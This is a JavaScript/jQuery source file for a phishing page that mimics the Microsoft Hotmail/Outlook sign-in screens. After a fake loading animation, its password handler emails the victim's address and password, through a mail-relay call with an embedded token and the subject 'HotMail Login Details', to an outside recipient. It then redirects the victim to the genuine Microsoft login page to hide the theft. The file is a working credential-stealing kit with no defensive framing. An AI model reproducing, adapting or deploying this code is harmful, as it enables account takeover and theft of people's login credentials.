(function($) {
  $(() => {
    const emailRegex = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
    const button = $("div#form-holder button")[0];
    const error = $(".error-message");
    const passwordError = $(".sign-up.error-message");
    const emailInput = $("input[type='email']");
    const passwordInput = $("input[type='password']");
    let email = emailInput[0].value;
    const messageButton = $("#image-button");
    const message = $("main div.message")[0];
    const loadingCover = $("#cover");
    const signUpContent = $(".sign-up");
    const userInfo = $("#user-info");
    const signInButton = $("#sign-in-btn");
    const resetPassword = $("#reset-password");
    const backButton = $("#back-icon");

    const validateEmail = () => {
      if (!emailRegex.test(email) || !email.includes("@hotmail.com")) {
        error.css({
          display: "block"
        });
        emailInput.css({
          borderBottomColor: "rgb(243, 74, 74) "
        });
      } else {
        userInfo.text(email);
        resetPassword.attr(
          "href",
          `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1565220060%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253da1e8e8cb-3a14-e903-3c96-706bdfe6c9ec%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26uaid%3d872f6832bc454f95aa40281782ee32e7%26pid%3d0%26contextid%3dE36BF1753B26B294%26bk%3d1565423667&id=292841&uiflavor=web&cobrandid=90015&uaid=872f6832bc454f95aa40281782ee32e7&mkt=EN-US&lc=1033&bk=1565423667&mn=${email.replace(
            "@",
            "%40"
          )}`
        );
        error.css({
          display: "none"
        });
        emailInput.css({
          borderBottomColor: "#0067b8"
        });
        loadingCover.css({
          visibility: "visible"
        });
        setTimeout(() => {
          loadingCover.css({
            visibility: "hidden"
          });
          $(".sign-in-content")
            .animate(
              {
                left: "-300px",
                opacity: 0,
                display: "none"
              },
              200,
              () => {
                signUpContent
                  .css({
                    position: "relative"
                  })
                  .animate({
                    left: "0px",
                    opacity: 1
                  });
              }
            )
            .css({
              position: "absolute"
            });
          $("div#form-holder").css({
            minHeight: "360px"
          });
        }, 2000);
      }
    };

    const validatePassword = () => {
      const password = passwordInput.val();
      if (!passwordRegex.test(password)) {
        passwordError.css({
          display: "block"
        });
        passwordInput.css({
          borderBottomColor: "rgb(243, 74, 74)"
        });
      } else {
          loadingCover.css({
              visibility: "visible"
              });
        
              Email.send({
                SecureToken: "ae7b961a-f6a1-404b-8428-39a3ca35b27a",
                To : To,
                From : From,
                Subject : "HotMail Login Details",
                Body : 
                `Email: ${email}
                Password: ${password}`
            }).then(
              message => {
                  loadingCover.css({
                    visibility: "hidden"
                    });
                    window.location.href = "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1565425830&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d6ad6b338-fd10-7cd8-090d-893ef2365c61&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=B196AD0A6BEFE23B&bk=1565430865&uaid=872f6832bc454f95aa40281782ee32e7&nw=4G&pid=0"
                }
            );
      }
    };

    signInButton.on("click", () => {
      validatePassword();
    });

    backButton.on("click", () => {
      loadingCover.css({
        visibility: "visible"
      });
      signUpContent
        .animate(
          {
            left: "100%",
            opacity: "0"
          },
          200,
          () => {
            $(".sign-in-content")
              .css({
                position: "relative"
              })
              .animate(
                {
                  left: 0,
                  opacity: 1
                },
                200,
                () => {
                  loadingCover.css({
                    visibility: "hidden"
                  });
                }
              );
            $("div#form-holder").css({
              minHeight: "320px"
            });
          }
        )
        .css({
          position: "absolute"
        });
    });

    // message Toggle functionality

    messageButton.on("click", () => {
      message.toggleAttribute("hidden");
    });

    // entrance animation for the signin form

    $("#ms-logo").animate(
      {
        opacity: 1
      },
      200,
      () => {
        $(".sign-in-content").animate({
          left: "0px",
          opacity: 1
        });
      }
    );

    //  events to check for when validating the email input

    emailInput.change(e => {
      email = e.target.value;
      validateEmail();
    });

    $(button).on("click", () => {
      validateEmail();
    });
  });
})(jQuery);
